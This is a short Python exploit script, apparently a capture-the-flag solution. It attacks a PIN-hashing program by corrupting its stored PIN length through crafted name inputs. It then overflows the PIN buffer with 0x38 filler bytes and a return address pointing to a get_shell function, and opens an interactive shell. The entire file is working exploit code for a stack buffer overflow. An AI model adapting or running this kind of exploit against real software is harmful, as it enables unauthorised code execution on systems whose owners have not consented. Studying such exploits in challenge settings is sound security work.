import interact
import struct

p = interact.Process()

# Corrupt pin_len
data = p.readuntil('Enter the size of the PIN you wish to use:')
p.sendline('3')
data = p.readuntil('Enter your first name:')
p.sendline('a'*20)
data = p.readuntil('Enter your last name:')
p.sendline('a'*20)
data = p.readuntil('Apply PIN Scrambling? [y/n]')
p.sendline('m')
data = p.readuntil('Continue generating hashes? [y/n]')
p.sendline('y')

data = p.readuntil('Enter your first name:')
p.sendline('a'*30)
data = p.readuntil('Enter your last name:')
p.sendline('a'*30)
data = p.readuntil('Apply PIN Scrambling? [y/n]')
p.sendline('m')
data = p.readuntil('Continue generating hashes? [y/n]')
p.sendline('y')

# Enter mask_with_pin()
data = p.readuntil('Enter your first name:')
p.sendline('a'*5)
data = p.readuntil('Enter your last name:')
p.sendline('a'*5)
data = p.readuntil('Apply PIN Scrambling? [y/n]')
p.sendline('y')

# Overflow user_pin with return address to get_shell
data = p.readuntil('Enter the PIN you wish to use:')
p.sendline('a'*0x38 + '\x21\x0b\x40\x00\x00\x00\x00\x00')

p.interactive()